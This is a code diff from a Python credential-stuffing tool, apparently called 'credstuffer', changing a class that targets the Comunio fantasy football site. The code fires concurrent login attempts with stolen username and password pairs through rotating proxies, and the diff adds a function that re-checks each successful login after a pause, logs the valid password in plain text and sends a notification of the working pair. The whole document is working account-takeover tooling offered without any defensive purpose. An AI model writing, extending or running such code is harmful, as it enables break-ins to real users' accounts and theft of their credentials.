@@ -1,5 +1,6 @@
 import logging
 import requests
+from time import sleep
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from credstuffer import UserAccount
@@ -15,13 +16,13 @@ class Comunio(UserAccount):
 
     """
 
-    def __init__(self, max_requests=10000, notify=None, **kwargs):
+    def __init__(self, max_requests=10000, notify=None, token=None, **kwargs):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class Comunio')
         self.name = 'Comunio'
 
         # init base class
-        super().__init__(name=self.name, notify=notify, **kwargs)
+        super().__init__(name=self.name, notify=notify, token=token, **kwargs)
 
         self.headers.update({
             'Origin': 'http://www.comunio.de',
@@ -56,9 +57,8 @@ class Comunio(UserAccount):
                                          .format(statuscode, user, password, self.session.proxies['http']))
 
                         if statuscode == 200:
-                            self.send_notification(username=user, password=password)
-                            # self.remove_username(username=user)  # temporary removed
-                        if statuscode == 500:
+                            self.is_credentials_correct(user=user, password=password)
+                        elif statuscode == 500:
                             self.logger.error(future.result().text)
             else:
                 # raise Error to renew Proxy
@@ -105,3 +105,18 @@ class Comunio(UserAccount):
             #self.session.proxies = {'http': '142.93.40.242:50001'}
         else:
             raise TypeError("proxy must be type of dictionary!")
+
+    def is_credentials_correct(self, user, password):
+        """ Double check of given credentials
+
+        :param user: username
+        :param password: password
+        """
+        sleep(2)
+        req_resp = self.__request_login(username=user, password=password)
+
+        if req_resp.status_code == 200:
+            self.logger.info("Fulfilled double check of credentials username: {} and password: {}".format(user, password))
+            self.send_notification(username=user, password=password)
+        else:
+            self.logger.error("Wrong comunio credentials username: {} and password: {}".format(user, password))
